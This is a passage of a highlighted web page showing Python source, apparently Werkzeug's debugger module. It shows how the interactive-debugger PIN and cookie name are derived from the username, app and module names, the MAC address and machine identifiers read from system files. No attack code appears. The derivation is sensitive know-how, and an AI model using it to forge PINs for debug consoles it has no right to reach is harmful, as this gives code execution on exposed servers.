</span><span class=lnt>364
</span><span class=lnt>365
</span><span class=lnt>366
</span><span class=lnt>367
</span><span class=lnt>368
</span><span class=lnt>369
</span><span class=lnt>370
</span><span class=lnt>371
</span><span class=lnt>372
</span><span class=lnt>373
</span><span class=lnt>374
</span><span class=lnt>375
</span><span class=lnt>376
</span><span class=lnt>377
</span><span class=lnt>378
</span><span class=lnt>379
</span><span class=lnt>380
</span><span class=lnt>381
</span><span class=lnt>382
</span><span class=lnt>383
</span><span class=lnt>384
</span><span class=lnt>385
</span><span class=lnt>386
</span><span class=lnt>387
</span><span class=lnt>388
</span><span class=lnt>389
</span><span class=lnt>390
</span><span class=lnt>391
</span><span class=lnt>392
</span><span class=lnt>393
</span><span class=lnt>394
</span><span class=lnt>395
</span><span class=lnt>396
</span><span class=lnt>397
</span><span class=lnt>398
</span><span class=lnt>399
</span><span class=lnt>400
</span><span class=lnt>401
</span><span class=lnt>402
</span><span class=lnt>403
</span><span class=lnt>404
</span><span class=lnt>405
</span><span class=lnt>406
</span><span class=lnt>407
</span><span class=lnt>408
</span><span class=lnt>409
</span><span class=lnt>410
</span><span class=lnt>411
</span><span class=lnt>412
</span><span class=lnt>413
</span><span class=lnt>414
</span><span class=lnt>415
</span><span class=lnt>416
</span><span class=lnt>417
</span><span class=lnt>418
</span><span class=lnt>419
</span><span class=lnt>420
</span><span class=lnt>421
</span><span class=lnt>422
</span><span class=lnt>423
</span><span class=lnt>424
</span><span class=lnt>425
</span><span class=lnt>426
</span><span class=lnt>427
</span><span class=lnt>428
</span><span class=lnt>429
</span><span class=lnt>430
</span><span class=lnt>431
</span><span class=lnt>432
</span><span class=lnt>433
</span><span class=lnt>434
</span><span class=lnt>435
</span><span class=lnt>436
</span><span class=lnt>437
</span><span class=lnt>438
</span><span class=lnt>439
</span><span class=lnt>440
</span><span class=lnt>441
</span><span class=lnt>442
</span><span class=lnt>443
</span><span class=lnt>444
</span><span class=lnt>445
</span><span class=lnt>446
</span><span class=lnt>447
</span><span class=lnt>448
</span><span class=lnt>449
</span><span class=lnt>450
</span><span class=lnt>451
</span><span class=lnt>452
</span><span class=lnt>453
</span><span class=lnt>454
</span><span class=lnt>455
</span><span class=lnt>456
</span><span class=lnt>457
</span><span class=lnt>458
</span><span class=lnt>459
</span><span class=lnt>460
</span><span class=lnt>461
</span><span class=lnt>462
</span><span class=lnt>463
</span><span class=lnt>464
</span><span class=lnt>465
</span><span class=lnt>466
</span><span class=lnt>467
</span><span class=lnt>468
</span><span class=lnt>469
</span><span class=lnt>470
</span><span class=lnt>471
</span><span class=lnt>472
</span><span class=lnt>473
</span><span class=lnt>474
</span><span class=lnt>475
</span><span class=lnt>476
</span><span class=lnt>477
</span><span class=lnt>478
</span><span class=lnt>479
</span><span class=lnt>480
</span><span class=lnt>481
</span><span class=lnt>482
</span><span class=lnt>483
</span><span class=lnt>484
</span><span class=lnt>485
</span><span class=lnt>486
</span><span class=lnt>487
</span><span class=lnt>488
</span><span class=lnt>489
</span><span class=lnt>490
</span><span class=lnt>491
</span><span class=lnt>492
</span><span class=lnt>493
</span><span class=lnt>494
</span><span class=lnt>495
</span><span class=lnt>496
</span><span class=lnt>497
</span><span class=lnt>498
</span><span class=lnt>499
</span><span class=lnt>500
</span><span class=lnt>501
</span><span class=lnt>502
</span><span class=lnt>503
</span><span class=lnt>504
</span><span class=lnt>505
</span><span class=lnt>506
</span><span class=lnt>507
</span><span class=lnt>508
</span><span class=lnt>509
</span><span class=lnt>510
</span><span class=lnt>511
</span><span class=lnt>512
</span><span class=lnt>513
</span><span class=lnt>514
</span><span class=lnt>515
</span><span class=lnt>516
</span><span class=lnt>517
</span><span class=lnt>518
</span><span class=lnt>519
</span><span class=lnt>520
</span><span class=lnt>521
</span><span class=lnt>522
</span><span class=lnt>523
</span><span class=lnt>524
</span><span class=lnt>525
</span><span class=lnt>526
</span><span class=lnt>527
</span><span class=lnt>528
</span><span class=lnt>529
</span><span class=lnt>530
</span><span class=lnt>531
</span><span class=lnt>532
</span><span class=lnt>533
</span><span class=lnt>534
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>getpass</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hashlib</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>json</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>pkgutil</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>re</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>typing</span> <span class=k>as</span> <span class=nn>t</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>uuid</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>contextlib</span> <span class=kn>import</span> <span class=n>ExitStack</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>contextlib</span> <span class=kn>import</span> <span class=n>nullcontext</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>io</span> <span class=kn>import</span> <span class=n>BytesIO</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>itertools</span> <span class=kn>import</span> <span class=n>chain</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>os.path</span> <span class=kn>import</span> <span class=n>basename</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>os.path</span> <span class=kn>import</span> <span class=n>join</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>zlib</span> <span class=kn>import</span> <span class=n>adler32</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>.._internal</span> <span class=kn>import</span> <span class=n>_log</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>..exceptions</span> <span class=kn>import</span> <span class=n>NotFound</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>..http</span> <span class=kn>import</span> <span class=n>parse_cookie</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>..security</span> <span class=kn>import</span> <span class=n>gen_salt</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>..utils</span> <span class=kn>import</span> <span class=n>send_file</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>..wrappers.request</span> <span class=kn>import</span> <span class=n>Request</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>..wrappers.response</span> <span class=kn>import</span> <span class=n>Response</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>.console</span> <span class=kn>import</span> <span class=n>Console</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>.tbtools</span> <span class=kn>import</span> <span class=n>DebugFrameSummary</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>.tbtools</span> <span class=kn>import</span> <span class=n>DebugTraceback</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>.tbtools</span> <span class=kn>import</span> <span class=n>render_console_html</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>t</span><span class=o>.</span><span class=n>TYPE_CHECKING</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=kn>from</span> <span class=nn>_typeshed.wsgi</span> <span class=kn>import</span> <span class=n>StartResponse</span>
</span></span><span class=line><span class=cl>    <span class=kn>from</span> <span class=nn>_typeshed.wsgi</span> <span class=kn>import</span> <span class=n>WSGIApplication</span>
</span></span><span class=line><span class=cl>    <span class=kn>from</span> <span class=nn>_typeshed.wsgi</span> <span class=kn>import</span> <span class=n>WSGIEnvironment</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># A week</span>
</span></span><span class=line><span class=cl><span class=n>PIN_TIME</span> <span class=o>=</span> <span class=mi>60</span> <span class=o>*</span> <span class=mi>60</span> <span class=o>*</span> <span class=mi>24</span> <span class=o>*</span> <span class=mi>7</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>hash_pin</span><span class=p>(</span><span class=n>pin</span><span class=p>:</span> <span class=nb>str</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>str</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>sha1</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>pin</span><span class=si>}</span><span class=s2> added salt&#34;</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s2>&#34;utf-8&#34;</span><span class=p>,</span> <span class=s2>&#34;replace&#34;</span><span class=p>))</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>()[:</span><span class=mi>12</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>_machine_id</span><span class=p>:</span> <span class=n>t</span><span class=o>.</span><span class=n>Optional</span><span class=p>[</span><span class=n>t</span><span class=o>.</span><span class=n>Union</span><span class=p>[</span><span class=nb>str</span><span class=p>,</span> <span class=nb>bytes</span><span class=p>]]</span> <span class=o>=</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_machine_id</span><span class=p>()</span> <span class=o>-&gt;</span> <span class=n>t</span><span class=o>.</span><span class=n>Optional</span><span class=p>[</span><span class=n>t</span><span class=o>.</span><span class=n>Union</span><span class=p>[</span><span class=nb>str</span><span class=p>,</span> <span class=nb>bytes</span><span class=p>]]:</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>_machine_id</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>_machine_id</span> <span class=ow>is</span> <span class=ow>not</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>_machine_id</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>_generate</span><span class=p>()</span> <span class=o>-&gt;</span> <span class=n>t</span><span class=o>.</span><span class=n>Optional</span><span class=p>[</span><span class=n>t</span><span class=o>.</span><span class=n>Union</span><span class=p>[</span><span class=nb>str</span><span class=p>,</span> <span class=nb>bytes</span><span class=p>]]:</span>
</span></span><span class=line><span class=cl>        <span class=n>linux</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># machine-id is stable across boots, boot_id is not.</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>filename</span> <span class=ow>in</span> <span class=s2>&#34;/etc/machine-id&#34;</span><span class=p>,</span> <span class=s2>&#34;/proc/sys/kernel/random/boot_id&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>filename</span><span class=p>,</span> <span class=s2>&#34;rb&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=n>value</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>readline</span><span class=p>()</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=k>except</span> <span class=ne>OSError</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>continue</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>value</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>linux</span> <span class=o>+=</span> <span class=n>value</span>
</span></span><span class=line><span class=cl>                <span class=k>break</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># Containers share the same machine id, add some cgroup</span>
</span></span><span class=line><span class=cl>        <span class=c1># information. This is used outside containers too but should be</span>
</span></span><span class=line><span class=cl>        <span class=c1># relatively stable across boots.</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;/proc/self/cgroup&#34;</span><span class=p>,</span> <span class=s2>&#34;rb&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>linux</span> <span class=o>+=</span> <span class=n>f</span><span class=o>.</span><span class=n>readline</span><span class=p>()</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span><span class=o>.</span><span class=n>rpartition</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;/&#34;</span><span class=p>)[</span><span class=mi>2</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=ne>OSError</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>pass</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>linux</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>linux</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># On OS X, use ioreg to get the computer&#39;s serial number.</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=c1># subprocess may not be available, e.g. Google App Engine</span>
</span></span><span class=line><span class=cl>            <span class=c1># https://github.com/pallets/werkzeug/issues/925</span>
</span></span><span class=line><span class=cl>            <span class=kn>from</span> <span class=nn>subprocess</span> <span class=kn>import</span> <span class=n>Popen</span><span class=p>,</span> <span class=n>PIPE</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>dump</span> <span class=o>=</span> <span class=n>Popen</span><span class=p>(</span>
</span></span><span class=line><span class=cl>                <span class=p>[</span><span class=s2>&#34;ioreg&#34;</span><span class=p>,</span> <span class=s2>&#34;-c&#34;</span><span class=p>,</span> <span class=s2>&#34;IOPlatformExpertDevice&#34;</span><span class=p>,</span> <span class=s2>&#34;-d&#34;</span><span class=p>,</span> <span class=s2>&#34;2&#34;</span><span class=p>],</span> <span class=n>stdout</span><span class=o>=</span><span class=n>PIPE</span>
</span></span><span class=line><span class=cl>            <span class=p>)</span><span class=o>.</span><span class=n>communicate</span><span class=p>()[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=k>match</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&#34;serial-number&#34; = &lt;([^&gt;]+)&#39;</span><span class=p>,</span> <span class=n>dump</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=k>match</span> <span class=ow>is</span> <span class=ow>not</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=k>match</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=p>(</span><span class=ne>OSError</span><span class=p>,</span> <span class=ne>ImportError</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>pass</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># On Windows, use winreg to get the machine guid.</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>sys</span><span class=o>.</span><span class=n>platform</span> <span class=o>==</span> <span class=s2>&#34;win32&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=kn>import</span> <span class=nn>winreg</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>with</span> <span class=n>winreg</span><span class=o>.</span><span class=n>OpenKey</span><span class=p>(</span>
</span></span><span class=line><span class=cl>                    <span class=n>winreg</span><span class=o>.</span><span class=n>HKEY_LOCAL_MACHINE</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                    <span class=s2>&#34;SOFTWARE</span><span class=se>\\</span><span class=s2>Microsoft</span><span class=se>\\</span><span class=s2>Cryptography&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                    <span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                    <span class=n>winreg</span><span class=o>.</span><span class=n>KEY_READ</span> <span class=o>|</span> <span class=n>winreg</span><span class=o>.</span><span class=n>KEY_WOW64_64KEY</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=p>)</span> <span class=k>as</span> <span class=n>rk</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=n>guid</span><span class=p>:</span> <span class=n>t</span><span class=o>.</span><span class=n>Union</span><span class=p>[</span><span class=nb>str</span><span class=p>,</span> <span class=nb>bytes</span><span class=p>]</span>
</span></span><span class=line><span class=cl>                    <span class=n>guid_type</span><span class=p>:</span> <span class=nb>int</span>
</span></span><span class=line><span class=cl>                    <span class=n>guid</span><span class=p>,</span> <span class=n>guid_type</span> <span class=o>=</span> <span class=n>winreg</span><span class=o>.</span><span class=n>QueryValueEx</span><span class=p>(</span><span class=n>rk</span><span class=p>,</span> <span class=s2>&#34;MachineGuid&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                    <span class=k>if</span> <span class=n>guid_type</span> <span class=o>==</span> <span class=n>winreg</span><span class=o>.</span><span class=n>REG_SZ</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                        <span class=k>return</span> <span class=n>guid</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s2>&#34;utf-8&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                    <span class=k>return</span> <span class=n>guid</span>
</span></span><span class=line><span class=cl>            <span class=k>except</span> <span class=ne>OSError</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>pass</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>_machine_id</span> <span class=o>=</span> <span class=n>_generate</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>_machine_id</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>_ConsoleFrame</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;Helper class so that we can reuse the frame console code for the
</span></span></span><span class=line><span class=cl><span class=s2>    standalone console.
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=fm>__init__</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>namespace</span><span class=p>:</span> <span class=n>t</span><span class=o>.</span><span class=n>Dict</span><span class=p>[</span><span class=nb>str</span><span class=p>,</span> <span class=n>t</span><span class=o>.</span><span class=n>Any</span><span class=p>]):</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>console</span> <span class=o>=</span> <span class=n>Console</span><span class=p>(</span><span class=n>namespace</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>id</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>eval</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>code</span><span class=p>:</span> <span class=nb>str</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=n>t</span><span class=o>.</span><span class=n>Any</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=bp>self</span><span class=o>.</span><span class=n>console</span><span class=o>.</span><span class=n>eval</span><span class=p>(</span><span class=n>code</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_pin_and_cookie_name</span><span class=p>(</span>
</span></span><span class=line><span class=cl>    <span class=n>app</span><span class=p>:</span> <span class=s2>&#34;WSGIApplication&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>)</span> <span class=o>-&gt;</span> <span class=n>t</span><span class=o>.</span><span class=n>Union</span><span class=p>[</span><span class=n>t</span><span class=o>.</span><span class=n>Tuple</span><span class=p>[</span><span class=nb>str</span><span class=p>,</span> <span class=nb>str</span><span class=p>],</span> <span class=n>t</span><span class=o>.</span><span class=n>Tuple</span><span class=p>[</span><span class=kc>None</span><span class=p>,</span> <span class=kc>None</span><span class=p>]]:</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;Given an application object this returns a semi-stable 9 digit pin
</span></span></span><span class=line><span class=cl><span class=s2>    code and a random key.  The hope is that this is stable between
</span></span></span><span class=line><span class=cl><span class=s2>    restarts to not make debugging particularly frustrating.  If the pin
</span></span></span><span class=line><span class=cl><span class=s2>    was forcefully disabled this returns `None`.
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>    Second item in the resulting tuple is the cookie name for remembering.
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>pin</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>environ</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;WERKZEUG_DEBUG_PIN&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>rv</span> <span class=o>=</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>    <span class=n>num</span> <span class=o>=</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Pin was explicitly disabled</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>pin</span> <span class=o>==</span> <span class=s2>&#34;off&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>None</span><span class=p>,</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Pin was provided explicitly</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>pin</span> <span class=ow>is</span> <span class=ow>not</span> <span class=kc>None</span> <span class=ow>and</span> <span class=n>pin</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;-&#34;</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>isdecimal</span><span class=p>():</span>
</span></span><span class=line><span class=cl>        <span class=c1># If there are separators in the pin, return it directly</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=s2>&#34;-&#34;</span> <span class=ow>in</span> <span class=n>pin</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>rv</span> <span class=o>=</span> <span class=n>pin</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>num</span> <span class=o>=</span> <span class=n>pin</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>modname</span> <span class=o>=</span> <span class=nb>getattr</span><span class=p>(</span><span class=n>app</span><span class=p>,</span> <span class=s2>&#34;__module__&#34;</span><span class=p>,</span> <span class=n>t</span><span class=o>.</span><span class=n>cast</span><span class=p>(</span><span class=nb>object</span><span class=p>,</span> <span class=n>app</span><span class=p>)</span><span class=o>.</span><span class=vm>__class__</span><span class=o>.</span><span class=vm>__module__</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>username</span><span class=p>:</span> <span class=n>t</span><span class=o>.</span><span class=n>Optional</span><span class=p>[</span><span class=nb>str</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=c1># getuser imports the pwd module, which does not exist in Google</span>
</span></span><span class=line><span class=cl>        <span class=c1># App Engine. It may also raise a KeyError if the UID does not</span>
</span></span><span class=line><span class=cl>        <span class=c1># have a username, such as in Docker.</span>
</span></span><span class=line><span class=cl>        <span class=n>username</span> <span class=o>=</span> <span class=n>getpass</span><span class=o>.</span><span class=n>getuser</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=p>(</span><span class=ne>ImportError</span><span class=p>,</span> <span class=ne>KeyError</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>username</span> <span class=o>=</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>mod</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>modules</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>modname</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># This information only exists to make the cookie unique on the</span>
</span></span><span class=line><span class=cl>    <span class=c1># computer, not as a security feature.</span>
</span></span><span class=line><span class=cl>    <span class=n>probably_public_bits</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>        <span class=n>username</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>modname</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=nb>getattr</span><span class=p>(</span><span class=n>app</span><span class=p>,</span> <span class=s2>&#34;__name__&#34;</span><span class=p>,</span> <span class=nb>type</span><span class=p>(</span><span class=n>app</span><span class=p>)</span><span class=o>.</span><span class=vm>__name__</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=nb>getattr</span><span class=p>(</span><span class=n>mod</span><span class=p>,</span> <span class=s2>&#34;__file__&#34;</span><span class=p>,</span> <span class=kc>None</span><span class=p>),</span>
</span></span><span class=line><span class=cl>    <span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># This information is here to make it harder for an attacker to</span>
</span></span><span class=line><span class=cl>    <span class=c1># guess the cookie name.  They are unlikely to be contained anywhere</span>
</span></span><span class=line><span class=cl>    <span class=c1># within the unauthenticated debug page.</span>
</span></span><span class=line><span class=cl>    <span class=n>private_bits</span> <span class=o>=</span> <span class=p>[</span><span class=nb>str</span><span class=p>(</span><span class=n>uuid</span><span class=o>.</span><span class=n>getnode</span><span class=p>()),</span> <span class=n>get_machine_id</span><span class=p>()]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>h</span> <span class=o>=</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>sha1</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>bit</span> <span class=ow>in</span> <span class=n>chain</span><span class=p>(</span><span class=n>probably_public_bits</span><span class=p>,</span> <span class=n>private_bits</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=ow>not</span> <span class=n>bit</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>continue</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nb>isinstance</span><span class=p>(</span><span class=n>bit</span><span class=p>,</span> <span class=nb>str</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>bit</span> <span class=o>=</span> <span class=n>bit</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s2>&#34;utf-8&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>h</span><span class=o>.</span><span class=n>update</span><span class=p>(</span><span class=n>bit</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>h</span><span class=o>.</span><span class=n>update</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;cookiesalt&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>cookie_name</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;__wzd</span><span class=si>{</span><span class=n>h</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>()[:</span><span class=mi>20</span><span class=p>]</span><span class=si>}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># If we need to generate a pin we salt it a bit more so that we don&#39;t</span>
</span></span><span class=line><span class=cl>    <span class=c1># end up with the same value and generate out 9 digits</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>num</span> <span class=ow>is</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>h</span><span class=o>.</span><span class=n>update</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;pinsalt&#34;</span><span class=p>)</span>
